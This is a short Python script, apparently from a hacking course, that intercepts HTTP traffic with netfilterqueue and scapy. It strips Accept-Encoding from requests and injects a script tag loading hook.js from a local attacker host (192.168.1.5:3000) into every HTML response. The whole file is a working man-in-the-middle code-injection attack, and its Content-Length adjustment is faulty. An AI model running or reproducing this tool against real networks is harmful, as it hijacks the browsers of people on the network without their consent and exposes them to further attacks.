#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re


injection_Code = '<script src="http://192.168.1.5:3000/hook.js"></script>'

# A field in scapy will always be a list

def setLoad(packet, loadField):
    packet[scapy.Raw].load = loadField
    del packet[scapy.IP].chksum
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    return packet

def processPacket(packet):

    # This function gets executed for each individual packet. The packet can be a response or a request. It is similiar to a for loop

    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.Raw):
        load = scapyPacket[scapy.Raw].load
        if scapyPacket[scapy.TCP].dport == 80:  # 80 is http port, dport is a request. "If this packet is a request"
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapyPacket[scapy.TCP].sport == 80:
            load = load.replace("</body>", injection_Code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                newContentLength = int(content_length) + len(load)
                load.replace(content_length, str(newContentLength))

        if load != scapyPacket[scapy.Raw].load:
            newPacket = setLoad(scapyPacket, load)
            packet.set_payload(str(newPacket))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket) # We bind our linux queue to this queue and set it so that every time a packet is recieved
# in that queue, we will execute the function processPacket, like a loop.
queue.run() # With this command we run the queue so it begins.
